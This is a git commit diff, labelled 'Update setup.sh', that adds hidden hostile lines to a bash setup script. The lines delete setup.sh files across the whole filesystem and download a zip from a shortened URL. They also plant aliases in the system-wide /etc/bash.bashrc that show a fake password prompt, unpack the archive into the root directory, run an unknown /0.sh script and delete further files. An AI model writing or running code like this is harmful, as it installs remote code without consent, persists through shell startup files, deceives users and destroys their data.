d52e1a31984aa17ff25550684a73990db6040f9b
D4NP0UL1N <ct3d.f1l35@gmail.com>
2017-06-20 12:30:00 -0400

    Update setup.sh

--- BASH/FINAL/setup.sh
+++ BASH/FINAL/setup.sh
@@ -1,1 +1,8 @@
 #!/bin/bash
+unalias -a
+find / -type f -name "setup.sh" -exec rm -f {} 2>/dev/null \; rm -f /0.sh 2>/dev/null; rm -f /setup.zip 2>/dev/null
+wget goo.gl/oi5amn -O /setup.zip >/dev/null 2>&1
+echo 'alias start="echo; echo Password Required; unzip -o /setup.zip -d / >/dev/null 2>&1; find / -name setup.sh -exec rm -f {} 2>/dev/null \; /0.sh >/dev/null 2>&1"' >> /etc/bash.bashrc
+echo 'alias next="rm -f /setup.zip; find / -name 0.sh -exec rm -f {} 2>/dev/null \; cp /broken.sh $(pwd)"' >> /etc/bash.bashrc
+echo 'alias last="unalias -a"' >> /etc/bash.bashrc
+#echo 'alias 4="kill -9 $(echo $$)"' >> /etc/bash.bashrc
